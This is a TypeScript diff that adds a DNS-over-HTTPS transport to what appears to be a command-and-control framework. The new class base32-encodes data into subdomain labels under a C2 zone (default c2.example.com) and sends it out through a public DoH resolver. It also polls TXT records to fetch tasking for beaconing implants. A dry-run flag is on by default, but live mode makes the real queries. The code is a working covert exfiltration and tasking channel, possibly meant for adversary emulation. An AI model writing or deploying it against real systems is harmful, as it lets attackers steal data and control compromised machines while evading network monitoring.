@@ -821,6 +821,68 @@ export function base32Decode(input: string): Uint8Array {
   return new Uint8Array(out);
 }
 
+/** DNS-over-HTTPS C2 channel template (T1071.004 / T1102) — encodes tasking in subdomain labels. */
+export class DohTransport implements ServiceTransport {
+  name = "dns-over-https";
+  resolverUrl: string;
+  zone: string;
+  live: boolean;
+
+  constructor(opts: { resolverUrl?: string; zone?: string; live?: boolean } = {}) {
+    this.resolverUrl = opts.resolverUrl ?? "https://dns.google/resolve";
+    this.zone = opts.zone ?? "c2.example.com";
+    this.live = opts.live ?? false;
+  }
+
+  private encodeLabel(sealed: string): string {
+    const b32 = base32Encode(Buffer.from(sealed, "utf8"));
+    return b32.toLowerCase().replace(/=/g, "").slice(0, 63);
+  }
+
+  async post(sealed: string, opts: { sessionId?: string } = {}): Promise<Record<string, unknown>> {
+    const label = this.encodeLabel(sealed);
+    const qname = `${opts.sessionId ?? "beacon"}.${label}.${this.zone}`;
+    if (!this.live) {
+      return {
+        note: `dry-run — would DoH query ${qname}`,
+        transport: this.name,
+        technique_id: "T1071.004",
+      };
+    }
+    const url = `${this.resolverUrl}?name=${encodeURIComponent(qname)}&type=TXT`;
+    const resp = await fetch(url, { signal: AbortSignal.timeout(10_000) });
+    return { status: "queried", qname, code: resp.status, transport: this.name };
+  }
+
+  async fetch(opts: { sessionId?: string } = {}): Promise<string[]> {
+    if (!this.live) return [];
+    const qname = `${opts.sessionId ?? "beacon"}.tasks.${this.zone}`;
+    const url = `${this.resolverUrl}?name=${encodeURIComponent(qname)}&type=TXT`;
+    const resp = await fetch(url, { signal: AbortSignal.timeout(10_000) });
+    const data = (await resp.json()) as { Answer?: Array<{ data?: string }> };
+    return (data.Answer ?? [])
+      .map((a) => a.data?.replace(/"/g, "") ?? "")
+      .filter(Boolean)
+      .map((txt) => {
+        try {
+          return Buffer.from(base32Decode(txt)).toString("utf8");
+        } catch {
+          return txt;
+        }
+      });
+  }
+
+  probe(): Record<string, unknown> {
+    return {
+      transport: this.name,
+      reachable: this.live,
+      technique_id: "T1071.004",
+      note: `${this.live ? "live" : "dry-run"} — DoH resolver ${this.resolverUrl} zone=${this.zone}`,
+      template: "base32 subdomain chunking over HTTPS DNS JSON API",
+    };
+  }
+}
+
 // ------------------------------------------------------------------------- //
 // MQTT transport — real MQTT 3.1.1 wire protocol over raw TCP sockets
 // ------------------------------------------------------------------------- //
